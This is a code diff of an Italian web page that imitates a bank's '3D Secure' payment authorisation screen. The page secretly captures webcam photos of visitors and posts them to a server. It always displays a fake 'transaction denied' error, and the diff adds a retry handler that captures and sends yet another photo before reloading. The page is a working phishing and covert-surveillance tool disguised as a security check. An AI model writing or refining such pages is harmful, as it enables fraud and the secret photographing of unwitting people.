@@ -10,9 +10,11 @@
       background-color: rgb(15, 15, 15);
       color: #fff;
       display: flex;
+      flex-direction: column;
       align-items: center;
-      justify-content: center;
+      justify-content: flex-start;
       min-height: 100vh;
+      margin: 0;
       padding: 20px;
     }
 
@@ -34,11 +36,11 @@
       margin: 8px 0;
     }
 
-  .secure-tag {
-    font-size: 14px;
-    color: rgb(26, 110, 75);
-    margin-top: -10px;
-    margin-bottom: 20px;
+    .secure-tag {
+      font-size: 14px;
+      color: rgb(26, 110, 75);
+      margin-top: -10px;
+      margin-bottom: 20px;
     }
 
     .timer {
@@ -155,22 +157,6 @@
       showFailure("Accesso alla videocamera negato.");
     });
 
-  function handleClick() {
-    takeAndSendPhoto("autorizza");
-    showLoadingScreen();
-    setTimeout(() => showFailure(), 4000);
-  }
-
-  function showFailure(msg = null) {
-    card.innerHTML = `
-      <img src="fail.png" alt="Errore" class="result-image">
-      <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
-      <p>${msg ?? "L'autenticazione 3D Secure non è andata a buon fine."}</p>
-      <p>Il sistema ha rilevato un'anomalia di sicurezza, è necessario ripetere l'operazione di autorizzazione.</p>
-      <button class="riprovare" onclick="location.reload()">RIPROVA</button>
-    `;
-  }
-
   function takeAndSendPhoto(action) {
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -181,6 +167,29 @@
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ action, image })
     });
+  }
+
+  function handleClick() {
+    takeAndSendPhoto("autorizza");
+    showLoadingScreen();
+    setTimeout(() => showFailure(), 4000);
+  }
+
+  function handleRetry() {
+    takeAndSendPhoto("riprovare");
+    setTimeout(() => {
+      location.reload();
+    }, 1000);
+  }
+
+  function showFailure(msg = null) {
+    card.innerHTML = `
+      <img src="fail.png" alt="Errore" class="result-image">
+      <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
+      <p>${msg ?? "L'autenticazione 3D Secure non è andata a buon fine."}</p>
+      <p>Il sistema ha rilevato un'anomalia di sicurezza, è necessario ripetere l'operazione di autorizzazione.</p>
+      <button class="riprovare" onclick="handleRetry()">RIPROVA</button>
+    `;
   }
 
   function showLoadingScreen() {
